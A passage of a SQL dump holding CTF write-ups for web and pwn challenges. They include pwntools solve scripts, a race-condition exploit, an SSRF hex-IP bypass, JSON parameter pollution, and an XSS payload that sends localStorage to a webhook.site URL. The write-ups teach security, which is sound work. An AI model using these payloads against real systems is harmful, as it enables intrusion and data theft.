r.recvuntil("NAME: aaaaaaa\n")\n    d = r.recvuntil("STUDENT ID")\n    data = d.split(b"\n")[0]+b"\0\0"\n    print(data)\n    leak = u64(data)\n    \n    libc_addr = leak - 2014176\n    print(hex(libc_addr))\n    libc.address = libc_addr\n    \n    r.sendline("3")\n    r.sendline("b1")\n    r.sendline(str(0xaaaaaaaaaaaaaa))\n    r.recvuntil("Exit Gradebook")\n    r.sendline("4")\n    r.sendline("b1")\n    print(hex(libc.sym.__malloc_hook))\n    r.sendline(b"a"*(1256+32)+p64(0x21)+p64(libc.sym.__malloc_hook))\n    r.recvuntil("Exit Gradebook")\n    r.sendline("1")\n    r.sendline("a3")\n    r.sendline("20")\n    r.sendline(p64(0xe6c81 +libc.address))\n    r.recvuntil("Exit Gradebook")\n    r.sendline("1")\n    r.sendline("a4")\n    r.sendline("20")\n\n    r.interactive()\n\n\nif __name__ == "__main__":\n    main()\n```\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (14, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Can\'t use DB\n\nCategory: Web\n\n> Can\'t use DB.\n> I have so little money that I can\'t even buy the ingredients for ramen.\n> \n\n`app.py`\n\n```python\n@app.route("/buy_noodles", methods=["POST"])\ndef buy_noodles():\n    user_id = session.get("user")\n    if not user_id:\n        return redirect("/")\n    balance, noodles, soup = get_userdata(user_id)\n    if balance >= 10000:\n        noodles += 1\n        open(f"./users/{user_id}/noodles.txt", "w").write(str(noodles))\n        time.sleep(random.uniform(-0.2, 0.2) + 1.0)\n        balance -= 10000\n        open(f"./users/{user_id}/balance.txt", "w").write(str(balance))\n        return "$10000"\n    return "ERROR: INSUFFICIENT FUNDS"\n\n\n@app.route("/buy_soup", methods=["POST"])\ndef buy_soup():\n    user_id = session.get("user")\n    if not user_id:\n        return redirect("/")\n    balance, noodles, soup = get_userdata(user_id)\n    if balance >= 20000:\n        soup += 1\n        open(f"./users/{user_id}/soup.txt", "w").write(str(soup))\n        time.sleep(random.uniform(-0.2, 0.2) + 1.0)\n        balance -= 20000\n        open(f"./users/{user_id}/balance.txt", "w").write(str(balance))\n        return "$20000"\n    return "ERROR: INSUFFICIENT FUNDS"\n\n\n@app.route("/eat")\ndef eat():\n    user_id = session.get("user")\n    if not user_id:\n        return redirect("/")\n    balance, noodles, soup = get_userdata(user_id)\n    shutil.rmtree(f"./users/{user_id}/")\n    session["user"] = None\n    if (noodles >= 2) and (soup >= 1):\n        return os.getenv("CTF4B_FLAG")\n    if (noodles >= 2):\n        return "The noodles seem to get stuck in my throat."\n    if (soup >= 1):\n        return "This is soup, not ramen."\n    return "Please make ramen."\n```\n\nThe app stores data in files, without any kind of locking. By sending parallel requests, we can buy noodles and soup without updating the balance. \n\nExploit:\n\n```python\nimport aiohttp\nimport asyncio\n\nasync def fetch(url, session):\n    return await session.post(url)\n\n\nasync def run():\n    async with aiohttp.ClientSession() as session:\n        root = "https://cant-use-db.quals.beginners.seccon.jp/"\n        r1 = await (await session.get(root)).text()\n        print(session.cookie_jar.filter_cookies(root))\n        tasks = [session.post(root+"/buy_noodles"),session.post(root+"/buy_noodles"),session.post(root+"/buy_soup")]\n        responses = await asyncio.gather(*tasks)\n        r2 = await (await session.get(root+"/eat")).text()\n        print(r2)\n\n\nif __name__ == \'__main__\':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(run())\n```\n\n`Flag: ctf4b{r4m3n_15_4n_3553n714l_d15h_f0r_h4ck1n6}`');
insert into writeup (challenge_id, poster_username, is_private)
values (15, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Check URL\n\nCategory: Web\n\n> Have you ever used `curl`?\n\n`index.php` provided:\n\n```php\n<?php\n    error_reporting(0);\nif ($_SERVER["REMOTE_ADDR"] === "127.0.0.1"){\n    echo "Hi, Admin or SSSSRFer<br>";\n    echo "********************FLAG********************";\n}else{\n    echo "Here, take this<br>";\n    $url = $_GET["url"];\n    if ($url !== "https://www.example.com"){\n        $url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "", $url); //Super sanitizing\n    }\n    if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){\n        die("do not hack me!");\n    }\n    echo "URL: ".$url."<br>";\n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $url);\n    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 2000);\n    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\n    echo "<iframe srcdoc=\'";\n    curl_exec($ch);\n    echo "\' width=\'750\' height=\'500\'></iframe>";\n    curl_close($ch);\n}\n?>\n```\n\nBasically, the code takes in a URL, fetches it using `cURL` and returns the contents. To get the flag, we must somehow send a HTTP request to the page from `127.0.0.1`, which is the local loopback address (aka localhost).\n\nHowever, exploiting this app is not as simple as entering `localhost`, because there are several checks in place. Let\'s look at each of them:\n\n1. ```php\n   $url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "", $url);\n   ```\n\n   This regex replaces everything that\'s not a letter, digit, `/` or `:` with . This means our URL cannot contain dots, which is a major problem\n\n2. ```php\n   if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){\n       die("do not hack me!");\n   }\n   ```\n\n   Entering `localhost` anywhere in the URL fails. Not sure what the apache one is for.\n\nSo how to send a request to localhost without using `localhost` or `127.0.0.1`? Luckily, [cURL supports a bunch of IP address formats](https://daniel.haxx.se/blog/2021/04/19/curl-those-funny-ipv4-addresses/), including the hex encoded format.\n\nIPv4 addresses can be represented in the form of a 32 bit integer, as they are essentially made up of 4 bytes. Here\'s a short program to convert a regular IP address to hex form:\n\n```python\ndef to_hex(addr):\n	return "0x"+"".join([hex(int(x))[2:].zfill(2) for x in addr.split(".")])\n>>> to_hex("127.0.0.1")\n\'0x7f000001\'\n```\n\nThus, when we go to `https://check-url.quals.beginners.seccon.jp/?url=0x7f000001`, the app makes a request to `127.0.0.1`, giving us the flag!\n\n`Flag: ctf4b{5555rf_15_53rv3r_51d3_5up3r_54n171z3d_r3qu357_f0r63ry}`\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (16, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# JSON\n\nCategory: Web\n\n> We have found an internal system that is externally exposed. Retrieve the Flag from this system.\n\nAnyway, a few go files are provided:\n\n`bff/main.go`\n\n```go\ntype Info struct {\n	ID int `json:"id" binding:"required"`\n}\n\n// check if the accessed user is in the local network (192.168.111.0/24)\nfunc checkLocal() gin.HandlerFunc {\n	// removed for brevity\n}\n\nfunc main() {\n	r := gin.Default()\n	r.Use(checkLocal())\n	r.LoadHTMLGlob("templates/*")\n\n	r.GET("/", func(c *gin.Context) {\n		c.HTML(200, "index.html", nil)\n	})\n\n	r.POST("/", func(c *gin.Context) {\n		// get request body\n		body, err := ioutil.ReadAll(c.Request.Body)\n		// parse json\n		var info Info\n		if err := json.Unmarshal(body, &info); err != nil {\n			c.JSON(400, gin.H{"error": "Invalid parameter."})\n			return\n		}\n		// validation\n		if info.ID < 0 || info.ID > 2 {\n			c.JSON(400, gin.H{"error": "ID must be an integer between 0 and 2."})\n			return\n		}\n		if info.ID == 2 {\n			c.JSON(400, gin.H{"error": "It is forbidden to retrieve Flag from this BFF server."})\n			return\n		}\n		// get data from api server\n		req, err := http.NewRequest("POST", "http://api:8000", bytes.NewReader(body))\n		if err != nil {\n			c.JSON(400, gin.H{"error": "Failed to request API."})\n			return\n		}\n		req.Header.Set("Content-Type", "application/json")\n		client := new(http.Client)\n		resp, err := client.Do(req)\n		defer resp.Body.Close()\n		result, err := ioutil.ReadAll(resp.Body)\n		c.JSON(200, gin.H{"result": string(result)})\n	})\n\n	if err := r.Run(":8080"); err != nil {\n		panic("server is not started")\n	}\n}\n\n```\n\n`api/main.go`\n\n```go\nfunc main() {\n	r := gin.Default()\n	r.POST("/", func(c *gin.Context) {\n		body, err := ioutil.ReadAll(c.Request.Body)\n		id, err := jsonparser.GetInt(body, "id")\n		if err != nil {\n			c.String(400, "Failed to parse json")\n			return\n		}\n		if id == 2 {\n			// Flag!!!\n			flag := os.Getenv("FLAG")\n			c.String(200, flag)\n			return\n		}\n\n		c.String(400, "No data")\n	})\n\n	if err := r.Run(":8000"); err != nil {\n		panic("server is not started")\n	}\n}\n```\n\nThe first challenge we need to overcome is the `checkLocal()` check. It doesn\'t seem we can use the SSRF attack in the previous challenge here. Maybe we can use something else?\n\n## `X-forwarded-for` header\n\nThe [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header is used by proxies to specify the originating IP address. By spoofing this address in postman, we can get past the first check.\n\n## JSON parameter pollution??\n\nNext, the application reads JSON body and checks that the `id` parameter is between 0 and 2 (inclusive). However, if `id==2`, it returns with an error message. Unfortunately, we need to set `id==2` to get the flag in `api/main.go`. I wasn\'t sure what to do here, but an application with 2 APIs seems to point toward HTTP parameter pollution, where a HTTP parameter is specified twice, and each API parses it differently. Could JSON also be vulnerable to such an attack?\n\nLet\'s look at how the JSON body is parsed in each API:\n\n`bff/main.go`\n\n```go\njson.Unmarshal(body, &info)\n```\n\nI couldn\'t find any information about how `json.Unmarshal` handles duplicate keys\n\n`api/main.go`\n\n```go\njsonparser.GetInt(body, "id")\n```\n\nHmm, definitely interesting! I also couldn\'t find out how this handles duplicate keys. I guess we\'ll just have to try both ways.\n\nLuckily, this payload worked:\n\n```json\n{\n    "id":2,\n    "id":0\n}\n```\n\nI suppose `json.Unmarshal` takes the second `id`, while `jsonparser` picks up the first one.\n\n`Flag: ctf4b{j50n_is_v4ry_u5efu1_bu7_s0metim3s_it_bi7es_b4ck}`\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (17, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Magic\n\nCategory: Web\n\n> Can you find the trick?\n\nThis is quite a complex XSS challenge, but it\'s very fun to solve.\n\nLogging into the site, we find a field to enter a memo. The memo will then be saved and displayed back to the user. Fortunately, the app forgot to HTML escape this field, which allows us to run an XSS attack. However, the major challenge is overcoming the restrictive CSP:\n\n`Content-Security-Policy: style-src \'self\' ; script-src \'self\' ; object-src \'none\' ; font-src \'none\'`\n\nPopping this into the [CSP Evaluator](https://csp-evaluator.withgoogle.com/) only gives 1 warning: \n\n```\nscript-src\n	\'self\' can be problematic if you host JSONP, Angular or user uploaded files.\n```\n\nHmm, it doesn\'t seem the site does any of this things. Or does it?\n\nDoing a bit more poking around, we discover an autologin feature. Each user has a unique token, which automatically logs them in when they go to `/magic?token=<token>`. However, when the token is wrong, it is echoed back, with some protections:\n\n```js\nfunction escapeHTML(string) {\n  return string\n    .replace(/\&/g, "&amp;")\n    .replace(/\</g, "&lt;")\n    .replace(/\>/g, "&gt;")\n    .replace(/\"/g, "&quot;")\n    .replace(/\'/g, "&#x27");\n}\n```\n\nThis seems pretty decent against regular XSS. But can we exploit it in a different context?\n\nIt turns out that when a browser sees `<script src="http://site.com/stuff"></script>` it fetches `stuff` from `http://site.com` and executes it as JavaScript (as long as it fulfills CSP). There is no check if `stuff` is actually a JavaScript file. So you could go `<script src="https://google.com">` and your browser would fetch Google and execute it as JavaScript. \n\nThus, we could do `<script src="/magic?token=<js here>//">` to execute arbitrary JS code. The only restriction is we\'re not allowed to use `\'` or `"`, but we can easily circumvent that by using backticks (`` ` ``). From reading the source of the crawler, we know the flag is stored in `localStorage`. Thus, our payload would be\n\n```html\n<script src="https://magic.quals.beginners.seccon.jp/magic?token=fetch([`https://webhook.site/747c4c4a-6eeb-4eba-877e-5438363a0a47`,localStorage.getItem(`memo`)].join(`/`))//"></script>\n```\n\n`Flag: ctf4b{w0w_y0ur_skil1ful_3xploi7_c0de_1s_lik3_4_ma6ic_7rick}`\n\nThis exploit is kind of like shellcode for web I suppose.');
insert into writeup (challenge_id, poster_username, is_private)
values (18, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Malloc\n\nCategory: Pwn\n\nPoints: 400\n\nSolves: 2\n\n> Can you somehow get the flag? Have fun!\n>\n> ```\n> nc challs.sieberrsec.tech 1470\n> ```\n\nThe exploit for this challenge was really simple (you could do it by hand) but it\'s quite difficult to find, which is probably why there were only 2 solves during the CTF.\n\n```c\n#include <unistd.h>\n\n#include <stdio.h>\n#include <stdlib.h>\n\n// cc malloc.c -o malloc -fstack-protector-all\nint main(void)\n{\n	// Variables\n	int *arr; // int pointer to an array\n	char *msg; // C-string to store your message\n	size_t length = 0;\n	// Welcome message\n	puts("Welcome to Sieberrsec CTF!");\n	// Allocates 123456 bytes of memory\n	arr = (int *)malloc(123456);\n	// Sets first element of arr to 1\n	arr[0] = 1;\n	// Leaks the memory address of arr\n	printf("Leak: %p\n", arr);\n	// Gets length of your message\n	printf("Length of your message: ");\n	scanf("%lu", &length);\n	// Allocates memory to store your message as a C-string\n	// +1 is to store the null-byte that ends the string\n	msg = malloc(length + 1);\n	// Reads length bytes of input into msg\n	printf("Enter your message: ");\n	read(0, msg, length);\n	// Null-byte to end the string\n	msg[length] = 0;\n	// Write length bytes from msg\n	write(1, msg, length);\n	// Your goal: somehow make arr[0] == 0\n	if (arr[0] == 0) {\n		system("cat flag");\n	}\n	return 0;\n}\n```\n\nOf course, when I saw the challenge name, I thought it was going to be a really complex heap challenge, so I popped up gdb and started debugging the binary. \n\n![image-20211227064425507](./images/heap_chunks.png)\n\nUnfortunately, the chunk we can write to (0x0000555555577d10) is after the chunk we want to write to (0x5555555596b0) so we probably can\'t do a heap overflow. The code doesn\'t seem vulnerable to heap overflows anyway. There are no frees, so it\'s probably not a "traditional" heap challenge.\n\nNext, I looked through the heap checklist (you can find it [here](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)):\n\n![](https://azeria-labs.com/wp-content/uploads/2019/03/heap-rules-CS.png)\n\nAha, the final rules is violated: the program does not check if malloc returns a valid pointer!\n\n```c\nmsg = malloc(length + 1);\n\n// Reads length bytes of input into msg\nprintf("Enter your message: ");\nread(0, msg, length);\n\n// Null-byte to end the string\nmsg[length] = 0;\n```\n\nMalloc returns a nullptr (pointer to 0x0) if it is unable to allocate enough memory. This can happen when we try to allocate a very large chunk. This can of course lead to null dereference bugs, but how does it lead to arbitrary write?? \n\nThis actually occurs when we do `msg[length]=0`. If `msg = nullptr`, then `msg[x] = *x`, since C array indexing is just pointer math. It also helps that `msg` is a char pointer so we don\'t need to divide by the size of the array element.\n\nSo now that we have arbitrary write, where do we write to? This is where the leak comes in. If we are able to set the byte at the leaked address to 0, we can get the flag:\n\n```c\n// Allocates 123456 bytes of memory\narr = (int *)malloc(123456);\n// Sets first element of arr to 1\narr[0] = 1;\n// Leaks the memory address of arr\nprintf("Leak: %p\n", arr);\n\n// more code here\n\n// Your goal: somehow make arr[0] == 0\nif (arr[0] == 0) {\n	system("cat flag");\n}\n```\n\nThe `arr` array is located on the heap, which has one of the highest memory addresses of a program\'s memory, so if we set `length=leak` and try to `msg = malloc(length)` it\'s going to return a null pointer. Then, when `msg[length] = 0` is executed, what actually happens is `*leak = 0`. This allows us to pass the `arr[0] == 0` check and get the flag!\n\n## Solve script\n\n```python\nfrom pwn import *\n\ne = ELF("./malloc")\ncontext.binary = e\n\ndef setup():\n    #p = e.process()\n    p = remote("challs.sieberrsec.tech", 1470)\n    return p\n\nif __name__ == \'__main__\':\n    p = setup()\n    p.recvline()\n    p.recvuntil("0x")\n    # Grab the leak and convert to decimal\n    leak = p.recvline(keepends=False)\n    leak = int(leak,16)\n    p.sendline(str(leak))\n    # Stupid scanf might greedily eat the newline we are going to send\n    pause(5)\n    p.sendline("")\n\n    p.interactive()\n```\n\n## Comments\n\nThis was actually quite an interesting challenge, because despite its seeming complexity, the solution was simple and (sort of?) elegant. I was a bit concerned that `read`ing to a `nullptr` would cause some problems, but fortunately it didn\'t crash or anything.\n\nBtw this website (where I got the checklist from) is a really good resource for learning heap:\n\n- https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/\n- https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/\n');
insert into writeup (challenge_id, poster_username, is_private)
values (19, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Simple\n\nCategory: pwn\n\nPoints: 62\n\nSolves: 47\n\n> Simple game right?\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\n// cc simple.c -o simple -fstack-protector-all\nint main(void)\n{\n	puts("Want a flag? Just play until you win!");\n	puts("Goal: Become a billionaire!");\n	int account_value = 1000000;\n	while (account_value < 1000000000) {\n		printf("\nAccount value: $%d\n", account_value);\n		puts("Commands:");\n		puts("1. Withdraw money");\n		puts("2. Deposit money");\n		printf("Choose an option [1/2]: ");\n		int option = 0;\n		scanf("%d", &option);\n		while (option != 1 && option != 2) {\n			puts("Invalid option!");\n			printf("Choose an option [1/2]: ");\n			scanf("%d", &option);\n		}\n		if (option == 1) {\n			printf("Amount to withdraw: ");\n			int withdrawal = 0;\n			scanf("%d", &withdrawal);\n			account_value -= withdrawal;\n		} else {\n			puts("LOL no you are not allowed to deposit money. :(");\n		}\n	}\n	printf("\nAccount value: $%d\n", account_value);\n	system("cat flag");\n	return 0;\n}\n```\n\nAt the start of the game, our account\'s value is `1000000`. However, we can only withdraw money, so how can we get our account value above `1000000000` to get the flag??\n\nLet\'s look at the code in a bit more detail:\n\n ```c\n if (option == 1) {\n     printf("Amount to withdraw: ");\n     int withdrawal = 0;\n     scanf("%d", &withdrawal);\n     account_value -= withdrawal;\n }\n ```\n\nWhen the withdraw option is selected, the program `scanf`s an integer. This reads an integer from the user. This integer is then subtracted from the account value. Sounds normal right? Well, we must remember that integers can be negative too! When we subtract a negative number from a number, the result is greater than the original number.\n\nSince our current balance is `1000000`, if we subtract `-999000010`, we will get `1000000010` which is more than is required to get the flag. \n\n```\n  ~ nc challs.sieberrsec.tech 8862\nWant a flag? Just play until you win!\nGoal: Become a billionaire!\n\nAccount value: $1000000\nCommands:\n1. Withdraw money\n2. Deposit money\nChoose an option [1/2]: 1\nAmount to withdraw: -999000010\n\nAccount value: $1000000010\nIRS{W377_D0NE_40U_G3N1u5_WBVAVEF}\n```\n\nAlternately, we could withdraw enough money such that the integer underflows, but that requires more math and is more complicated. ');
insert into writeup (challenge_id, poster_username, is_private)
values (20, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Turbo crypto part 2\n\nCategory: Pwn\n\nPoints: 900\n\nSolves: 1\n\n> Using the key you extracted, we found a [link](https://drive.google.com/uc?id=19mmImjpreALZSs0D88BtLY65cFBkHsMC&export=download) to the source code for `turbofastcrypto`. There happens to be a secret `flag` file on the server, and you need to extract it.\n\nThe authors generously decided to place a first blood bounty of 1 month of discord nitro on this challenge :heart:.\n\nThe source code contains a `turbofastcrypto.c` (reproduced below), a shared object (which I had no experience pwning) and a bunch of other files which were mostly setup files.\n\n```c\n#define PY_SSIZE_T_CLEAN\n#include <Python.h>\n\nchar IV[64] = "IRS{secrets_are_revealed!!}";\n\n#pragma GCC optimize ("O0")\n__attribute__ ((used)) static void print_flag() { system("cat flag"); }\n\nstatic PyObject *encrypt(PyObject *self, PyObject *args) {\n    const char *cmd;\n    Py_ssize_t len;\n    if (!PyArg_ParseTuple(args, "s#", &cmd, &len)) return NULL;\n    for (int i = 0; i < len; i++) IV[i] ^= cmd[i];\n    return PyBytes_FromStringAndSize(IV, len);\n}\n\nstatic PyMethodDef mtds[] = {\n    {"encrypt", encrypt, METH_VARARGS, "Encrypt a string" },\n    { NULL, NULL, 0, NULL }\n};\n\nstatic struct PyModuleDef moddef = {\n    PyModuleDef_HEAD_INIT,\n    "turbofastcrypto", \n    NULL,\n    -1,\n    mtds\n};\n\nPyMODINIT_FUNC PyInit_turbofastcrypto() { return PyModule_Create(&moddef);}\n```\n\nThis code looks really intimidating (probably the hard part of this challenge). It defines a python C extension, which is built into a shared object, which is then loaded into the CPython runtime, so python code can call these functions.\n\nAt first, I thought the bug was some kind of improper use of the cpython functions `PyArg_ParseTuple` and `PyBytes_FromStringAndSize` but according to the documentation they seem to be used correctly.\n\nThe `for` loop was much more interesting though. Each character of the user\'s input is XORed with the IV array and stored back to the IV array. However, there is no bounds checking here, so if the user\'s input is longer than the size of IV (64 bytes), we could leak, and potentially write memory!\n\nI wrote a small script to leak memory:\n\n```python\nfrom pwn import *\np = remote("challs.sieberrsec.tech", 3477)\n\n# anything ^ 0 = anything\narr = [0 for _ in range(200)]\np.sendline(bytes(arr))\np.recvuntil("Encrypted:")\n# probably should use safeeval but whatever\nl = eval(p.recvline())\nprint(hexdump(l))\n```\n\nAs expected, we see the flag, then a bunch of memory addresses.\n\n![image-20211227072236432](./images/dump.png)\n\nIf you run this a few times, you\'ll find that the leak addresses are different every time, except for the first byte (the LSB, things are little endian here) ~~(and also the second digit of the second byte but that\'s not important)~~. This is probably due to PIE or some other kind of ASLR for shared objects, which randomizes the addresses of functions. Anyway, I ran `objdump -d <the shared object>` to find out what these functions were:\n\n![image-20211227072656684](./images/objdump.png)\n\nHmmm, the `encrypt` function ends in `0xc0`, which is exactly the same as the leaked address we saw earlier! And the `print_flag` function\'s address only differs by 1 byte! If we\'re able to modify the `0xc0` to `0xa0` we can (hopefully) get the `print_flag` function to be called.\n\nWe can do this by XORing the 72nd byte (the location of the first `0xc0`) with 96, since `0xc0 ^ 96 = 160 = 0xa0`. Fortunately, 96 is within the ASCII range, so it shouldn\'t have any issues.\n\nI made slight modifications to the script to set the 72nd byte:\n\n```python\nfrom pwn import *\np = remote("challs.sieberrsec.tech", 3477)\n\n# anything ^ 0 = anything\narr = [0 for _ in range(200)]\narr[72] = 96\np.sendline(bytes(arr))\np.interactive()\n```\n\nWhen I ran the script, nothing happened and I was really worried that I had messed up somewhere. However, when I pressed enter, the script sent the flag. I realized that instead of overwriting the return pointer, I had overwritten some kind of function table that cpython uses to jump to the C extensions. When the function is executed again, the `print_flag` function is called instead of the `encrypt` function. However, the program crashes afterwards with the error:\n\n```\nTraceback (most recent call last):\n  File "./tfc.py", line 4, in <module>\n    ciphertext = turbofastcrypto.encrypt(plaintext)\nSystemError: <built-in function encrypt> returned NULL without setting an error\n```\n\nwhich is completely expected and ok since I\'ve already gotten the flag.\n\n## Comments\n\nI actually got really confused when writing this writeup cos I saw `0x0c` as `0xc0` and thought the index was 64. During the CTF I used `.index` to find the index so it was fine. I also got the chance to use the really useful pwntools `hexdump` function, which was cool.\n\nThanks again to the authors for this great challenge and the nitro!');
insert into writeup (challenge_id, poster_username, is_private)
values (21, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# warmup\n\nCategory: pwn\n\nPoints: 316\n\nSolves: 17\n\nThe following code is provided:\n\n```c\n#include <stdio.h>\nint main() {\n    char input[32];\n    char flag[32];\n    // read flag file\n    FILE *f = fopen("flag", "r");\n    fgets(flag, 32, f);\n    fclose(f);\n    // read the user\'s guess\n    fgets(input, 0x32, stdin);\n    // if user\'s guess matches the flag\n    if (!strcmp(flag,input)) {\n        puts("Predicted!");\n        system("cat flag");\n    } else puts("Your flag was wrong :(");\n}\n```\n\nWe observe that a buffer overflow occurs when `fgets(input, 0x32, stdin);` is executed. This is because `0x32 = 50`, but the buffer is only 32 bytes long. However, since the `flag` buffer is also 32 bytes long, we do not have enough bytes to overwrite `[rsp]` in order to control `$rip` in a ret2<anything\> attack, so we will need to think of an alternate solution.\n\nThe buffers `flag` and `input` are compared against each other using `strcmp`, and if they are equal, the flag is printed. However, without knowing the flag, how are we going to get these two buffers be equal??\n\nWe can use the buffer overflow to overwrite part of the `flag` buffer. However, we can only write the first 18 bytes of the buffer (50-32=18), so we can\'t just overwrite both buffers with \'a\'s. \n\nHowever, strings in C are null terminated - they end with a null byte, which has the value 0. So in C, the strings "flag\0aaaaa" and "flag\0bbbbb" will be `strcmp` equal to each other. Using this property, we can add a null byte before the 18th byte of the second buffer. This will \'trick\' `strcmp` into thinking that the string in the second buffer has ended, while in fact there are another 12 bytes of flag in the buffer.\n\nHere\'s a visual representation of the attack:\n\nLayout of the 2 buffers:\n\n```\n\n0                          32                         64\n\n                                                    \n        Input buffer              Flag buffer       \n\n```\n\nWhat happens normally when a user enters stuff\n\n```\n0                          32                         64\n   \n                                                    \n Our input goes here!\0     IRS{THE_FLAG!!!!!}\0    \n\n```\n\nNote: the \0 is a null byte. You can\'t see null bytes but we will use \0 to represent them\n\nWhat happens when you enter more than 32 bytes of input (not to scale):\n\n```\n0                          32                         64\n\n                                                    \n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0AG!!!!!}\0    \n\n```\n\nThe input buffer overflows and overwrites the start of the flag buffer. But we cannot overwrite everything!\n\nThe attack (not to scale):\n\n```\n\n0                          32                         64\n\n                                                    \n   AAAAAAAAAAAAAA\0PADDINGAAAAAAAAAAAAAA\0!!!!}\0    \n\n        input                flag      \n           \n```\n\nSince `strcmp` only compares `input` and `flag` up to the null byte, it thinks the 2 strings are equal and gives us the flag!\n\nHowever, we must ensure that we have sufficient padding that the AAAAA.. lines up correctly with the start of the flag buffer.\n\n## Solve script\n\n```python\n\nfrom pwn import *\n\ne = ELF("./chal")\ncontext.binary = e\n\ndef setup():\n    #p = e.process()\n    p = remote("challs.sieberrsec.tech",3476)\n    return p\nif __name__ == \'__main__\':\n    p = setup()\n    # For the first buffer: 16 \'a\'s, a null byte and 15 bytes of padding -> 32 bytes in total\n    # For the second buffer: 16 \'a\'s and a null byte\n    p.send(b"a"*16+b"\0"+b"\0"*15 + b"a"*16+b"\0")\n\n\n    p.interactive()\n```\n\n## Comments\n\nIdk why I decided to do ASCII art for this writeup, it kinda looks nice but quite pain to make. Hopefully it looks nice on github.');
insert into writeup (challenge_id, poster_username, is_private)
values (22, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# BabyPHP\n\n### burden_bear\n\n**Category: Web**\n\n> John is trying to juggle between learning PHP and his other homework. Fortunately, he managed to complete his PHP task - creating a simple web login. He challenges you to find a way to bypass his login.\n>\n> Take a look at his PHP masterpiece now! [chals.whitehacks.ctf.sg:50201](http://chals.whitehacks.ctf.sg:50201/)\n\nFlag: `WH2021{H0p3d_u_h4d_f4n_juGGl15g}`\n\nThere are multiple parts to this challenge, let\'s look at it part by part.\n\n## Part 1:\n\n```php\n$t = $_GET[\'ticket\'];\n\nif ($t !== base64_encode("ILuvWH2021")) {\n    die("Do you hate us?");\n}\n```\n\nThe code checks that the `ticket` HTTP parameter is equal to the [base64 encoded](https://en.wikipedia.org/wiki/Base64) version of `ILuvWH2021`, which is `SUx1dldIMjAyMQ==`\n\n## Part 2:\n\n```php\n$c1 = $_GET[\'code1\'];\n$c2 = $_GET[\'code2\'];\nif(!isset($c1) || !isset($c2)) {\n    die("Is that all you got?");\n}\n\nif(md5($c1) != 0 || $c2 != sha1($c2)) {\n    die("Try harder!");\n}\n```\n\nThe second part is a bit more challenging. It is widely known that ~~php sucks~~ php suffers from a range of vulnerabilities, but [magic hashes](https://www.whitehatsec.com/blog/magic-hashes/) are less well known.\n\n#### Part 1.1: Type juggling\n\nPHP\'s equality checks can be very surprising, due to its support for type juggling. Let\'s look at an example:\n\n```php\necho 11 == "11ctf"; // True (11==11)\necho 0 == "0e11"; // True (0==0)\necho "0e12" == "0e11"; // True\n```\n\nInterestingly, all of the above comparisons are True. \n\nWhen the two values being compared are of different types, such as int and string in example 1 and 2, PHP coerces the string to an int and compares them.\n\nExample 3 is a lot more interesting. `"0e12"` and `"0e11"` are clearly strings, that are clearly not equal. Well, PHP interprets a string starting  with `[x]e` followed by digits as `x *  10 ** digits`. For example, `"2e6"==2000000` (2 million). \n\nWhile `"0e12"` and `"0e11"` are clearly not equal, `0*10**12=0*10**13=0`. \n\nRead more: [here](https://news.ycombinator.com/item?id=9484757)\n\n#### Part 1.2: Hashing\n\nThe output of hash algorithms, like MD5, is usually a hex string, containing characters `[0-9][a-f]` like `de28a20d12beef`. \n\n(Un)fortunately, `0e` is a valid hex string that could be produced by a hash algorithm. Although the bytes after `0e` are random hex characters, when PHP compares the hashes, each hash evaluates to zero. \n\nWhile it may take a while to generate these hashes, someone has kindly put together a [repo](https://github.com/spaze/hashes) of strings that produce hashes starting with `0e`.\n\n#### Part 1.3: Putting it together\n\nLet\'s look at this code snippet in more detail.\n\n```php\nif(md5($c1) != 0 || $c2 != sha1($c2)) {\n    die("Try harder!");\n}\n```\n\nFirstly, we will need to find a string whose MD5 hash is equal to zero (in PHP). There are plenty of strings to choose from, we can choose `NOOPCJF`.\n\nSecondly, we need to find a string whose SHA1 hash is equal to itself. This is a special condition as both the string and its hash must start with `0e`. Fortunately, there are still a bunch of them in the repo, such as `0e01010111000111111010101011010111010100`.\n\n## Part 3:\n\n```php\n$c3 = $_GET[\'code3\'];\nif (!isset($c3) || $c3 === $c1 || $c3 != 0 || md5($c3) != md5($c1)) {\n    die("Try harrrrderrrr.");\n}\n```\n\nThis part is quite similar to part 2. We need to find a string, not equal to the strings in part 2, whose MD5 hash is equal to the hash of the previous string, which is zero as we have found out earlier. We can pick another string from the md5 file in the repo, such as `GZECLQZ`.\n\n## Part 4: \n\nI was stuck for a really long time on this part. I went to solve other challenges before coming back to this. \n\n```php\n$user = $_GET[\'username\'];\n$pass = $_GET[\'pass\'];\n\n// HA! Now its salted, see how you gonna get past it!\nif ($user !== $pass && md5($user.$salt) === md5($pass.$salt)) {\n    